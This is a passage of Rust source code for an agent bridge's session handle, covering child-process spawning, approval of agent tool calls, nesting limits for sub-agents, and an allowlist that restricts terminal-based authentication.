//! Per-session state + child process handle.

use crate::agent_runtime::acp::{
    classify_jsonrpc_error, extract_observed_tool_activity, sha256_hex_canonical,
    sha256_hex_canonical_excluding, AcpClient, AcpDebugLog, AcpSessionUpdate,
    AuthClientCapabilities, AuthenticateRequest, AuthenticateResponse, ClientCapabilities,
    ContentBlock, FsClientCapabilities, InitializeRequest, JsonRpcError, NewSessionRequest,
    ObservedToolActivity, PermissionRequest, PromptRequest, SessionNotification, ToolKind,
    ToolStatus, DEFAULT_RAW_OUTPUT_CAP_BYTES, TOOL_CALL_HASH_DROP_FIELDS,
};
use crate::agent_runtime::{AgentDefinition, AgentKind};
use crate::notify::{activity_event, Severity as NotifySeverity};
use crate::ws::envelope::{ClientCommand, ServerEvent};
use bridge_core::{EventRing, StateHolder};
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::{Arc, Mutex as StdMutex};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::process::{Child, ChildStdin, Command};
use tokio::sync::{broadcast, mpsc, Mutex, RwLock};
use tracing::{info, warn};

use super::assessment_validation::{
    validate_candidate, AssessmentValidationTracker, CandidateFinding, CandidateRejection,
};

pub type SessionHandleRef = Arc<SessionHandle>;

/// One in-flight `session/request_permission` waiting on a user
/// decision via the bridge's `approval.approve` / `approval.reject`
/// commands. Stage X.5c.1.
#[derive(Debug, Clone)]
pub struct PendingApproval {
    /// JSON-RPC request id from the agent. Required to round-trip
    /// the response.
    pub acp_request_id: u64,
    /// Permission options as the agent sent them. Each entry is a
    /// JSON object with at least `optionId` and `kind`. Bridge picks
    /// one based on the user's approve/reject choice.
    pub options: Vec<serde_json::Value>,
    /// Agent's `toolCall` payload — surfaced to the UI verbatim so
    /// the user knows what they're approving.
    pub tool_call: serde_json::Value,
    pub created_at: chrono::DateTime<chrono::Utc>,
    pub timeout_handle: Arc<tokio::task::AbortHandle>,
}

/// X.5c.2 — recently-resolved approval kept around so subsequent
/// `tool_call` / `tool_call_update` notifications can attach
/// `approved_by_approval_id`. Two lookup keys per entry:
/// primary `(session_id, toolCallId)`, fallback
/// `(session_id, approval_tool_call_hash)`. TTL: 60s after resolve.
#[derive(Debug, Clone)]
pub(crate) struct ResolvedApprovalCacheEntry {
    pub(crate) approval_id: String,
    pub(crate) expires_at: tokio::time::Instant,
}

/// ACP-specific runtime state. Present iff `agent_kind = Acp`.
pub struct AcpRuntime {
    pub client: AcpClient,
    /// ACP session id obtained from the agent's `session/new` response.
    /// Distinct from VAC's `SessionHandle::id` — the bridge needs both
    /// to route prompts and cancellations.
    pub acp_session_id: String,
    /// Auth methods advertised by initialize. Surfaced to the web so
    /// the cockpit can show a Zed-style reauth affordance.
    pub(crate) auth_methods: serde_json::Value,
    /// Agent capabilities from initialize response. Forwarded in
    /// session.ready so the frontend can adapt UI.
    pub(crate) agent_capabilities: serde_json::Value,
    /// Agent info from initialize response.
    pub(crate) agent_info: serde_json::Value,
    /// Active terminal handles for ACP terminal/* methods.
    #[allow(dead_code)]
    pub(crate) terminals: Arc<
        dashmap::DashMap<String, Arc<crate::agent_runtime::acp::terminal_handler::TerminalHandle>>,
    >,
    /// In-flight `session/request_permission` requests keyed by the
    /// VAC approval id (ULID generated on inbound). X.5c.1.
    pub pending_approvals: dashmap::DashMap<String, PendingApproval>,
    /// Default permission timeout for this agent (from agents.toml).
    pub permission_timeout_ms: u64,
    /// X.5c.2 correlation: toolCallId → resolved approval (primary).
    pub(crate) approval_by_tool_call_id: dashmap::DashMap<String, ResolvedApprovalCacheEntry>,
    /// X.5c.2 correlation: approval_tool_call_hash → resolved approval
    /// (fallback for when the agent rotates / omits toolCallId).
    pub(crate) approval_by_full_hash: dashmap::DashMap<String, ResolvedApprovalCacheEntry>,
    /// X.5c.2 audit sink. None disables the tool.* audit rows.
    pub(crate) audit: Option<Arc<crate::audit::AuditFacility>>,
    /// ACP wire tap for debug logging and `acp.debug_message` emission.
    pub(crate) debug: Option<Arc<AcpDebugLog>>,
    /// Configured agent command (from `agents.toml`). Used by
    /// `authenticate_via_acp` to verify any terminal-auth command
    /// advertised by the adapter actually matches the agent we spawned
    /// — the bridge refuses to launch arbitrary commands even when an
    /// allowlisted agent is involved.
    pub(crate) agent_command: PathBuf,
    /// X.5h.1 — sub-agent task scope stack. When OpenCode (or any
    /// ACP agent that emits a `kind: other` tool call titled `task`)
    /// dispatches a sub-agent, we push the parent tool_call_id when
    /// the task transitions to pending/in_progress, and pop on
    /// completed/failed. Subsequent tool calls and thought chunks
    /// snapshot the current top as their `parent_tool_call_id` so the
    /// FE can render a Trae-style nested tree without inventing
    /// temporal heuristics.
    pub(crate) task_scope: StdMutex<Vec<String>>,
    /// Stage X.5h.2 — OpenCode HTTP API tap for sub-agent tool activity.
    /// Populated post-spawn when --port flag was wired; None otherwise.
    pub(crate) subagent_tap:
        StdMutex<Option<Arc<crate::agent_runtime::opencode_serve::OpencodeSubagentTap>>>,
}

const APPROVAL_CORRELATION_TTL: std::time::Duration = std::time::Duration::from_secs(60);

/// X.5h.3 — hard cap on how deep a sub-agent task chain can nest. We
/// chose 4 because it covers the realistic workflow surface (root →
/// dispatched sub-agent → nested helper → helper-of-helper) without
/// letting a runaway recursion blow up the timeline. Anything beyond
/// this cap surfaces flat under the depth-4 ancestor; the bridge
/// emits a `tracing::warn!` for each refused push so dogfood can
/// spot misbehaving adapters.
pub(crate) const MAX_SUBAGENT_DEPTH: usize = 4;

/// X.5h.3 — outcome of [`AcpRuntime::enter_task_scope`]. Lets the
/// caller distinguish between "new task pushed" (the common case),
/// "already present" (idempotent re-entry from repeated
/// in_progress frames), and "refused because depth cap was hit".
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum EnterTaskScopeResult {
    /// The task was pushed; `new_depth` is the resulting stack depth
    /// (1-indexed, so the very first push yields `new_depth = 1`).
    Pushed { new_depth: usize },
    /// The task was already on the stack; nothing changed.
    AlreadyPresent,
    /// The stack was already at [`MAX_SUBAGENT_DEPTH`] entries; the
    /// task was **not** pushed. `current_depth` is the unchanged
    /// stack depth, `max_depth` is the cap.
    RefusedDepthExceeded {
        current_depth: usize,
        max_depth: usize,
    },
}

/// X.5h.3 — pure helper that owns the depth-cap + idempotency rules
/// for the sub-agent task scope stack. Lifted out of
/// [`AcpRuntime::enter_task_scope`] so unit tests can drive it without
/// constructing a full `AcpRuntime` (which requires a spawned ACP
/// child). The runtime method just locks the mutex and delegates.
pub(crate) fn try_push_task_scope(
    stack: &mut Vec<String>,
    tool_call_id: &str,
) -> EnterTaskScopeResult {
    if stack.iter().any(|id| id.as_str() == tool_call_id) {
        return EnterTaskScopeResult::AlreadyPresent;
    }
    if stack.len() >= MAX_SUBAGENT_DEPTH {
        return EnterTaskScopeResult::RefusedDepthExceeded {
            current_depth: stack.len(),
            max_depth: MAX_SUBAGENT_DEPTH,
        };
    }
    stack.push(tool_call_id.to_string());
    EnterTaskScopeResult::Pushed {
        new_depth: stack.len(),
    }
}

/// X.5h.3 — pure mirror of `AcpRuntime::current_task_parent` that
/// operates on a borrowed slice. Used by the unit tests to assert
/// what a descendant would snapshot, without faking a runtime.
#[cfg(test)]
pub(crate) fn current_task_parent_in(stack: &[String], self_tool_call_id: &str) -> Option<String> {
    stack
        .iter()
        .rev()
        .find(|id| id.as_str() != self_tool_call_id)
        .cloned()
}

impl AcpRuntime {
    /// Insert a freshly-resolved approval into both correlation maps.
    /// Called from `SessionHandle::resolve_approval` on success.
    /// Stale entries are swept on the next lookup.
    fn record_resolved_approval(&self, approval_id: &str, tool_call: &serde_json::Value) {
        let expires_at = tokio::time::Instant::now() + APPROVAL_CORRELATION_TTL;
        let entry = ResolvedApprovalCacheEntry {
            approval_id: approval_id.to_string(),
            expires_at,
        };
        if let Some(tcid) = tool_call.get("toolCallId").and_then(|v| v.as_str()) {
            self.approval_by_tool_call_id
                .insert(tcid.to_string(), entry.clone());
        }
        let hash = sha256_hex_canonical_excluding(tool_call, TOOL_CALL_HASH_DROP_FIELDS);
        self.approval_by_full_hash.insert(hash, entry);
    }

    /// X.5h.1 — return the current sub-agent task tool_call_id to use
    /// as `parent_tool_call_id` for child events. Returns `None` when
    /// no task is active. Skips its own id (a task tool call's pending
    /// frame must not parent itself).
    pub(crate) fn current_task_parent(&self, self_tool_call_id: &str) -> Option<String> {
        let stack = self.task_scope.lock().ok()?;
        stack
            .iter()
            .rev()
            .find(|id| id.as_str() != self_tool_call_id)
            .cloned()
    }

    /// X.5h.1 — push a parent task onto the scope stack. Idempotent:
    /// repeated pending/in_progress frames for the same task do not
    /// double-push.
    ///
    /// X.5h.3 — also enforce a **depth cap** so a buggy or adversarial
    /// adapter cannot fork-bomb the timeline by recursively dispatching
    /// sub-agents forever. When the stack is already at
    /// [`MAX_SUBAGENT_DEPTH`] tasks deep, the new task is **not** pushed:
    /// it (and any of its children) will surface under the
    /// depth-cap-ancestor instead of nesting further. The caller is
    /// expected to log the refusal so dogfood can spot pathological
    /// providers.
    ///
    /// The depth-cap logic itself lives in the pure helper
    /// [`try_push_task_scope`] so it can be unit tested without
    /// constructing a whole `AcpRuntime`.
    pub(crate) fn enter_task_scope(&self, tool_call_id: &str) -> EnterTaskScopeResult {
        if let Ok(mut stack) = self.task_scope.lock() {
            return try_push_task_scope(&mut stack, tool_call_id);
        }
        // Lock poisoned — conservative no-op; treat as already-present
        // so the caller doesn't double-emit a depth-exceeded warning
        // for what is really a panic-recovery edge case.
        EnterTaskScopeResult::AlreadyPresent
    }

    /// X.5h.1 — remove a finished task from the scope stack. Removes
    /// from anywhere in the stack to tolerate out-of-order completion
    /// (parallel sub-agents).
    pub(crate) fn exit_task_scope(&self, tool_call_id: &str) {
        if let Ok(mut stack) = self.task_scope.lock() {
            stack.retain(|id| id.as_str() != tool_call_id);
        }
    }

    /// Lookup correlation by primary key, then fallback. Returns the
    /// approval_id if a non-expired entry matches. Sweeps any expired
    /// entries it touches.
    fn correlate_approval(
        &self,
        tool_call_id: &str,
        approval_tool_call_hash: Option<&str>,
    ) -> Option<String> {
        let now = tokio::time::Instant::now();
        if let Some(e) = self.approval_by_tool_call_id.get(tool_call_id) {
            if e.expires_at > now {
                return Some(e.approval_id.clone());
            }
            drop(e);
            self.approval_by_tool_call_id.remove(tool_call_id);
        }
        if let Some(h) = approval_tool_call_hash {
            if let Some(e) = self.approval_by_full_hash.get(h) {
                if e.expires_at > now {
                    return Some(e.approval_id.clone());
                }
                drop(e);
                self.approval_by_full_hash.remove(h);
            }
        }
        None
    }
}

/// Stage X.5d — typed result of `SessionHandle::authenticate_via_acp`.
#[derive(Debug, Clone)]
pub struct AuthenticateOutcome {
    pub method_id: String,
    pub method_type: String,
    pub response: AuthenticateResponse,
}

/// Stage X.5d — typed error for `SessionHandle::authenticate_via_acp`.
/// Codes are stable strings consumed by the translator + the FE so the
/// cockpit can render explicit reauth diagnostics rather than a generic
/// failure.
#[derive(Debug, Clone)]
pub enum AuthenticateError {
    /// Session is not running an ACP agent. There is no adapter to
    /// authenticate against.
    NotAcpSession,
    /// `method_id` was not present in the adapter's advertised
    /// `initialize.authMethods`. The bridge refuses to forward
    /// arbitrary method ids — the adapter is the source of truth for
    /// what's supported, but the bridge enforces the gate.
    MethodNotAdvertised(String),
    /// Method type is `terminal`. Terminal-driven auth requires the
    /// `terminal/*` ACP capability which is intentionally HELD off in
    /// this milestone (control plane vs. runtime capability boundary).
    TerminalCapabilityDisabled { method_id: String },
    /// Method type is `env_var`. Live-restart of the ACP child with a
    /// new env overlay is sized as a follow-up slice; for now the FE
    /// is told to recreate the session with the env var set in the
    /// bridge's launch environment.
    EnvVarRecreateRequired {
        method_id: String,
        vars: Vec<serde_json::Value>,
    },
    /// Adapter responded with an error to `authenticate`. `code` is the
    /// classified JSON-RPC error code (or `"agent.protocol_error"` for
    /// non-typed errors); `message` is the raw adapter message.
    AdapterFailed {
        method_id: String,
        method_type: String,
        code: &'static str,
        message: String,
    },
    /// Method type is `terminal` but the agent is not on the bridge's
    /// terminal-auth allowlist. The bridge refuses to run terminal
    /// commands for arbitrary adapters — only agents we’ve explicitly
    /// vetted (currently just `gemini-acp`) may use this path. This
    /// stops a malicious or compromised ACP adapter from advertising a
    /// terminal-auth command that would execute locally.
    TerminalAuthNotAllowed { method_id: String, agent_id: String },
}

impl AuthenticateError {
    /// Stable error code surfaced via ack + ServerEvent payload.
    pub fn code(&self) -> &'static str {
        match self {
            AuthenticateError::NotAcpSession => "auth.not_supported",
            AuthenticateError::MethodNotAdvertised(_) => "auth.method_not_advertised",
            AuthenticateError::TerminalCapabilityDisabled { .. } => {
                "auth.terminal_capability_disabled"
            }
            AuthenticateError::EnvVarRecreateRequired { .. } => "auth.env_var_recreate_required",
            AuthenticateError::AdapterFailed { code, .. } => code,
            AuthenticateError::TerminalAuthNotAllowed { .. } => "auth.terminal_auth_not_allowed",
        }
    }

    /// Method id the user attempted to authenticate with, if any. Used
    /// for audit + ServerEvent payloads.
    pub fn method_id(&self) -> Option<&str> {
        match self {
            AuthenticateError::NotAcpSession => None,
            AuthenticateError::MethodNotAdvertised(id) => Some(id),
            AuthenticateError::TerminalCapabilityDisabled { method_id }
            | AuthenticateError::EnvVarRecreateRequired { method_id, .. }
            | AuthenticateError::AdapterFailed { method_id, .. }
            | AuthenticateError::TerminalAuthNotAllowed { method_id, .. } => Some(method_id),
        }
    }

    /// Method type the user attempted to authenticate with, if known.
    pub fn method_type(&self) -> Option<&str> {
        match self {
            AuthenticateError::TerminalCapabilityDisabled { .. } => Some("terminal"),
            AuthenticateError::EnvVarRecreateRequired { .. } => Some("env_var"),
            AuthenticateError::AdapterFailed { method_type, .. } => Some(method_type),
            AuthenticateError::TerminalAuthNotAllowed { .. } => Some("terminal"),
            _ => None,
        }
    }

    /// Human-readable message for ack + ServerEvent + audit row.
    pub fn message(&self) -> String {
        match self {
            AuthenticateError::NotAcpSession => {
                "session is not running an ACP agent; reauth is only supported for ACP sessions"
                    .into()
            }
            AuthenticateError::MethodNotAdvertised(id) => format!(
                "auth method '{id}' is not in the adapter's advertised authMethods"
            ),
            AuthenticateError::TerminalCapabilityDisabled { method_id } => format!(
                "auth method '{method_id}' requires the terminal ACP capability which is held off in this milestone"
            ),
            AuthenticateError::EnvVarRecreateRequired { method_id, .. } => format!(
                "auth method '{method_id}' requires env vars set in the bridge's launch environment; close and recreate the session after exporting them"
            ),
            AuthenticateError::AdapterFailed { message, .. } => message.clone(),
            AuthenticateError::TerminalAuthNotAllowed { method_id, agent_id } => format!(
                "terminal auth method '{method_id}' is not allowed for agent '{agent_id}' (only allowlisted agents may use bridge-driven terminal auth)"
            ),
        }
    }
}

pub struct SessionHandle {
    pub id: String,
    pub profile_id: String,
    pub project_root: PathBuf,
    pub agent_id: String,
    pub agent_kind: AgentKind,
    /// Workflow spec id and display name for the session's WorkflowProcess.
    pub workflow_spec_id: String,
    pub workflow_spec_name: String,
    pub state: Arc<StateHolder>,
    pub ring: Arc<RwLock<EventRing<ServerEvent>>>,
    /// Stdin for Mock / VacNative engines (legacy JSON-RPC notification
    /// dialect). `None` for ACP — `acp.client` owns its own stdin.
    pub stdin: Arc<Mutex<Option<ChildStdin>>>,
    pub broadcast: broadcast::Sender<ServerEvent>,
    /// ACP runtime state when this session is backed by an ACP agent.
    pub acp: Option<Arc<AcpRuntime>>,
    /// Bridge audit sink, shared across ACP and JSON-RPC sessions.
    pub audit: Option<Arc<crate::audit::AuditFacility>>,
    assessment_validation: Arc<Mutex<AssessmentValidationTracker>>,
}

pub struct SpawnOptions {
    pub session_id: String,
    pub profile_id: String,
    pub project_root: PathBuf,
    pub agent: AgentDefinition,
    /// Optional audit sink. When present, the X.5c.2 tool-activity
    /// path writes `tool.observed` / `tool.updated` / `tool.failed`
    /// rows. None on legacy back-compat shims and on JSON-RPC
    /// engines that don't emit ACP tool activity yet.
    pub audit: Option<Arc<crate::audit::AuditFacility>>,
    /// Workflow spec id to use for this session's WorkflowProcess.
    /// When `None`, the registry default is used.
    pub workflow_id: Option<String>,
    /// Path to capability profile YAMLs. Used by the ACP spawn path to
    /// load the profile for fs/terminal capability enforcement.
    pub profile_root: PathBuf,
}

/// Allowlist of agent ids that may use bridge-driven terminal auth.
/// Anything outside this list returns `auth.terminal_auth_not_allowed`
/// even if the adapter advertises a terminal auth method. Keep this
/// as small as possible — each entry is effectively
/// “this CLI’s configured command may be invoked locally for login”.
const TERMINAL_AUTH_ALLOWED_AGENTS: &[&str] = &["gemini-acp"];

/// Synthetic auth method id for the Gemini CLI ACP login flow. Mirrors
/// Zed’s `GEMINI_TERMINAL_AUTH_METHOD_ID = "spawn-gemini-cli"` so the
/// cockpit renders the same affordance Zed users see.
pub const GEMINI_TERMINAL_AUTH_METHOD_ID: &str = "spawn-gemini-cli";

/// Strip ACP runtime flags from a command’s args. Used when the bridge
/// synthesizes a terminal-auth invocation — the auth flow needs the
/// CLI in interactive (login) mode, not in ACP server mode.
pub(crate) fn strip_acp_args(args: &[String]) -> Vec<String> {
    args.iter()
        .filter(|a| a.as_str() != "--acp" && a.as_str() != "--experimental-acp")
        .cloned()
        .collect()
}

/// Build the synthetic Gemini terminal-auth method JSON. The command
/// and args come straight from the configured `AgentDefinition` (with
/// ACP flags removed) — the adapter never gets to influence what we
/// run.
fn synthesize_gemini_terminal_auth_method(
    agent_command: &Path,
    agent_args: &[String],
) -> serde_json::Value {
    let stripped = strip_acp_args(agent_args);
    serde_json::json!({
        "id": GEMINI_TERMINAL_AUTH_METHOD_ID,
        "type": "terminal",
        "name": "Login with Gemini CLI",
        "description": "Login with your Google or Vertex AI account",
        "_meta": {
            "terminal-auth": {
                "command": agent_command.to_string_lossy(),
                "args": stripped,
            }
        }
    })
}

/// Append a synthesized terminal-auth method to whatever the adapter
/// advertised. If the adapter already advertises a method with the
/// same id, we leave it alone — the per-agent allowlist + command
/// match check in `authenticate_via_acp` is the actual safety gate.
fn merge_synthetic_terminal_auth_method(
    advertised: serde_json::Value,
    synthesized: serde_json::Value,
) -> serde_json::Value {
    let mut arr = advertised.as_array().cloned().unwrap_or_default();
    let synth_id = synthesized
        .get("id")
        .and_then(|v| v.as_str())
        .unwrap_or_default()
        .to_string();
    let already_present = arr
        .iter()
        .any(|m| m.get("id").and_then(|v| v.as_str()) == Some(synth_id.as_str()));
    if !already_present {
        arr.push(synthesized);
    }
    serde_json::Value::Array(arr)
}

impl SessionHandle {
    /// Spawn child engine process (mock-engine or vac serve) + wire stdio.
    ///
    /// Stage X.1: the engine binary now flows through an
    /// [`AgentDefinition`] resolved from the runtime registry. The
    /// effective command line is preserved exactly:
    ///
    /// ```text
    /// <agent.command> <agent.args...> --profile <p> --session-id <s> --project <root>
    /// ```
    ///
    /// `agent.args` defaults to `["--stdio"]` for mock + vac-native via
    /// the embedded config, matching the pre-X.1 hardcoded arg order.
    pub async fn spawn(opts: SpawnOptions) -> anyhow::Result<SessionHandleRef> {
        match opts.agent.kind {
            AgentKind::Acp => Self::spawn_acp(opts).await,
            AgentKind::Mock | AgentKind::VacNative => Self::spawn_jsonrpc(opts).await,
        }
    }

    /// Legacy JSON-RPC notification stdio engines: mock-engine and
    /// `vac serve`. CLI arg conventions preserved verbatim.
    async fn spawn_jsonrpc(opts: SpawnOptions) -> anyhow::Result<SessionHandleRef> {
        let mut cmd = Command::new(&opts.agent.command);
        cmd.args(&opts.agent.args)
            .arg("--profile")
            .arg(&opts.profile_id)
            .arg("--session-id")
            .arg(&opts.session_id)
            .arg("--project")
            .arg(&opts.project_root)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .kill_on_drop(true);
        let mut child: Child = cmd.spawn()?;

        let stdin = child
            .stdin
            .take()
            .ok_or_else(|| anyhow::anyhow!("no stdin"))?;
        let stdout = child
            .stdout
            .take()
            .ok_or_else(|| anyhow::anyhow!("no stdout"))?;
        let stderr = child
            .stderr
            .take()
            .ok_or_else(|| anyhow::anyhow!("no stderr"))?;

        let state = Arc::new(StateHolder::new());
        let ring = Arc::new(RwLock::new(EventRing::<ServerEvent>::new(5000)));
        let (bcast_tx, _) = broadcast::channel::<ServerEvent>(512);

        // Resolve workflow spec. Unknown ids are rejected upstream at the
        // translator layer; this branch hard-errors to guard internal callers.
        let (workflow_spec, workflow_spec_id, workflow_spec_name) = {
            use crate::workflows::WorkflowRegistry;
            let reg = WorkflowRegistry::global();
            let default_id = WorkflowRegistry::default_build_spec_id();
            match opts.workflow_id.as_deref() {
                Some(wid) => {
                    let spec = reg.get(wid).cloned().ok_or_else(|| {
                        anyhow::anyhow!("workflow.not_found: '{wid}' is not a bundled workflow")
                    })?;
                    let name = spec.metadata.name.clone();
                    (Some(spec), wid.to_string(), name)
                }
                None => {
                    let spec = reg.get(default_id).cloned();
                    let name = spec
                        .as_ref()
                        .map(|s| s.metadata.name.clone())
                        .unwrap_or_default();
                    (spec, default_id.to_string(), name)
                }
            }
        };

        let handle = Arc::new(Self {
            id: opts.session_id.clone(),
            profile_id: opts.profile_id.clone(),
            project_root: opts.project_root.clone(),
            agent_id: opts.agent.id.clone(),
            agent_kind: opts.agent.kind,
            workflow_spec_id,
            workflow_spec_name,
            state: Arc::clone(&state),
            ring: Arc::clone(&ring),
            stdin: Arc::new(Mutex::new(Some(stdin))),
            broadcast: bcast_tx.clone(),
            acp: None,
            audit: opts.audit.clone(),
            assessment_validation: Arc::new(Mutex::new(AssessmentValidationTracker::default())),
        });

        info!(
            session_id = %handle.id,
            profile_id = %handle.profile_id,
            agent_id = %handle.agent_id,
            agent_kind = %handle.agent_kind.as_str(),
            command = %opts.agent.command.display(),
            project_root = %handle.project_root.display(),
            "session spawned"
        );

        state.transition(bridge_core::SessionState::Ready).ok();

        // Pump stderr to tracing.
        let sid_err = handle.id.clone();
        tokio::spawn(async move {
            let mut lines = BufReader::new(stderr).lines();
            while let Ok(Some(l)) = lines.next_line().await {
                tracing::debug!(session = %sid_err, "engine_stderr: {l}");
            }
        });

        // JSON-RPC notification stream — Mock + VacNative dialect.
        let handle_clone = Arc::clone(&handle);
        let kind = handle.agent_kind;
        tokio::spawn(async move {
            let mut lines = BufReader::new(stdout).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                process_jsonrpc_line(&line, &handle_clone).await;
            }
            info!(session = %handle_clone.id, agent_kind = %kind.as_str(), "engine stdout closed");
            let _ = handle_clone
                .state
                .transition(bridge_core::SessionState::Closing);
            let _ = handle_clone
                .state
                .transition(bridge_core::SessionState::Closed);
        });

        // Spawn watchdog: when child exits, transition state. Non-zero
        // exits emit a transcript.error event so web surfaces can
        // distinguish a clean close from a crash.
        let handle_wait = Arc::clone(&handle);
        tokio::spawn(async move {
            let status = child.wait().await;
            info!(session = %handle_wait.id, status = ?status, "child exited");
            let crashed = status.as_ref().map(|s| !s.success()).unwrap_or(true);
            if crashed {
                let ts = chrono::Utc::now().to_rfc3339();
                let event = ServerEvent {
                    seq: 0,
                    session_id: handle_wait.id.clone(),
                    event_type: "transcript.error".into(),
                    payload: serde_json::json!({
                        "reason": "child_exited",
                        "agent_id": handle_wait.agent_id,
                        "agent_kind": handle_wait.agent_kind.as_str(),
                        "status": format!("{status:?}"),
                    }),
                    v: 1,
                    ts,
                };
                emit_event(&handle_wait, event).await;
            }
            let _ = handle_wait
                .state
                .transition(bridge_core::SessionState::Closing);
            let _ = handle_wait
                .state
                .transition(bridge_core::SessionState::Closed);
        });

        // Spawn VIL-style workflow process for this session.
        if let Some(spec) = workflow_spec {
            use crate::workflows::process::start_workflow_process;
            start_workflow_process(
                handle.id.clone(),
                Arc::clone(&ring),
                bcast_tx.clone(),
                bcast_tx.subscribe(),
                spec,
            );
        }

        Ok(handle)
    }

    pub async fn send_to_engine(&self, line: &str) -> anyhow::Result<()> {
        let mut guard = self.stdin.lock().await;
        let stdin = guard
            .as_mut()
            .ok_or_else(|| anyhow::anyhow!("stdin closed"))?;
        stdin.write_all(line.as_bytes()).await?;
        stdin.write_all(b"\n").await?;
        stdin.flush().await?;
        Ok(())
    }

    /// Translate a browser-side `ClientCommand` into the wire dialect
    /// of the backing agent and forward it to the child.
    ///
    /// - `Mock` / `VacNative` → JSON-RPC notification on stdin
    ///   `{"jsonrpc":"2.0","id":<cmd.id>,"method":<cmd.cmd_type>,"params":<cmd.payload>}`.
    /// - `Acp` (Stage X.5b) → typed ACP requests via the in-process
    ///   `AcpClient`. Currently:
    ///     - `message.submit` → `session/prompt`. The prompt response
    ///       and intervening `session/update` notifications are pumped
    ///       into VAC events by the spawn-time subscriber task.
    ///     - `message.cancel_stream` → `session/cancel` (notification).
    ///     - everything else → `agent.protocol_unsupported` (X.5c
    ///       widens this).
    pub async fn send_client_command(&self, cmd: &ClientCommand) -> anyhow::Result<()> {
        // Emit internal workflow signal so WorkflowProcess can react to prompt input.
        // ClientCommand is not broadcast to the session ring, so we emit a namespaced
        // internal event here. WorkflowProcess ignores workflow.* self-events.
        if cmd.cmd_type == "message.submit" {
            emit_to(
                &self.ring,
                &self.broadcast,
                ServerEvent {
                    seq: 0,
                    session_id: self.id.clone(),
                    event_type: "workflow.input.message_submit".into(),
                    payload: serde_json::json!({ "cmd_type": "message.submit" }),
                    v: 1,
                    ts: chrono::Utc::now().to_rfc3339(),
                },
            )
            .await;
        }
        match self.agent_kind {
            AgentKind::Mock | AgentKind::VacNative => {
                let rpc = serde_json::json!({
                    "jsonrpc": "2.0",
                    "id": cmd.id,
                    "method": cmd.cmd_type,
                    "params": cmd.payload,
                });
                self.send_to_engine(&rpc.to_string()).await
            }
            AgentKind::Acp => self.handle_acp_command(cmd).await,
        }
    }

    async fn handle_acp_command(&self, cmd: &ClientCommand) -> anyhow::Result<()> {
        let acp = self
            .acp
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("ACP runtime not initialized for this session"))?;
        match cmd.cmd_type.as_str() {
            "message.submit" => {
                let text = cmd
                    .payload
                    .get("text")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string();
                let req = PromptRequest {
                    session_id: acp.acp_session_id.clone(),
                    prompt: vec![ContentBlock::Text { text: text.clone() }],
                };
                // Fire prompt; response handler (spawned at session
                // creation) emits transcript.completed when this future
                // resolves. We don't await here — the bridge ack should
                // return ok=true immediately and the user observes the
                // streamed deltas as they land.
                let acp = Arc::clone(acp);
                let handle_id = self.id.clone();
                let bcast = self.broadcast.clone();
                let ring = Arc::clone(&self.ring);
                info!(
                    session_id = %handle_id,
                    acp_session_id = %acp.acp_session_id,
                    text_len = text.len(),
                    "ACP session/prompt dispatching"
                );
                tokio::spawn(async move {
                    match acp.client.prompt(req).await {
                        Ok(resp) => {
                            info!(
                                session_id = %handle_id,
                                stop_reason = ?resp.stop_reason,
                                "ACP session/prompt completed"
                            );
                            let event = ServerEvent {
                                seq: 0,
                                session_id: handle_id.clone(),
                                event_type: "transcript.completed".into(),
                                payload: serde_json::json!({
                                    "stop_reason": resp.stop_reason,
                                    "usage": resp.usage,
                                }),
                                v: 1,
                                ts: chrono::Utc::now().to_rfc3339(),
                            };
                            emit_to(&ring, &bcast, event).await;
                        }
                        Err(e) => {
                            warn!(session_id = %handle_id, error=%e, "ACP session/prompt failed");
                            // If the underlying error is a JsonRpcError
                            // from the agent, classify it into a stable
                            // bridge code so web clients can react
                            // (session.not_found, agent.protocol_invalid_params,
                            // agent.protocol_unsupported, agent.internal,
                            // agent.protocol_error) instead of just a
                            // free-form string.
                            let code = e
                                .downcast_ref::<crate::agent_runtime::acp::JsonRpcError>()
                                .map(classify_jsonrpc_error)
                                .unwrap_or("agent.protocol_error");
                            let event = ServerEvent {
                                seq: 0,
                                session_id: handle_id.clone(),
                                event_type: "transcript.error".into(),
                                payload: serde_json::json!({
                                    "reason": "prompt_failed",
                                    "code": code,
                                    "error": e.to_string(),
                                }),
                                v: 1,
                                ts: chrono::Utc::now().to_rfc3339(),
                            };
                            emit_to(&ring, &bcast, event).await;
                        }
                    }
                });
                Ok(())
            }
            "message.cancel_stream" => acp.client.cancel(&acp.acp_session_id).await,
            other => anyhow::bail!(
                "agent.protocol_unsupported: command '{other}' is not yet wired for ACP (X.5c scope)"
            ),
        }
    }

    /// Stage X.5d — drive ACP `authenticate` for the given method id.
    /// Returns the parsed adapter response on success, or a typed
    /// [`AuthenticateError`] otherwise. The translator owns audit + event
    /// emission; this method only owns the bridge → adapter handshake.
    pub async fn authenticate_via_acp(
        &self,
        method_id: &str,
    ) -> Result<AuthenticateOutcome, AuthenticateError> {
        let acp = self.acp.as_ref().ok_or(AuthenticateError::NotAcpSession)?;

        // Look up the requested method against what the adapter
        // advertised at initialize time. Reject anything that wasn't
        // advertised — the bridge is the policy point, not the adapter.
        let methods = acp.auth_methods.as_array().cloned().unwrap_or_default();
        let method = methods
            .iter()
            .find(|m| {
                m.get("id")
                    .and_then(|v| v.as_str())
                    .map(|id| id == method_id)
                    .unwrap_or(false)
            })
            .ok_or_else(|| AuthenticateError::MethodNotAdvertised(method_id.to_string()))?;

        let method_type = method
            .get("type")
            .and_then(|v| v.as_str())
            .unwrap_or("agent")
            .to_string();

        // Guardrail: terminal auth is only supported when the adapter
        // advertises terminal-auth command metadata. That lets the
        // bridge launch the login flow itself without enabling
        // terminal/* ACP tool capability.
        if method_type == "terminal" {
            // Patch C — allowlist gate. Only specific agent ids may
            // run terminal-auth commands at all. This is the primary
            // defense against a malicious or compromised ACP adapter
            // advertising a terminal-auth command we'd otherwise
            // execute locally.
            if !TERMINAL_AUTH_ALLOWED_AGENTS.contains(&self.agent_id.as_str()) {
                return Err(AuthenticateError::TerminalAuthNotAllowed {
                    method_id: method_id.to_string(),
                    agent_id: self.agent_id.clone(),
                });
            }
            let terminal_auth = method
                .get("_meta")
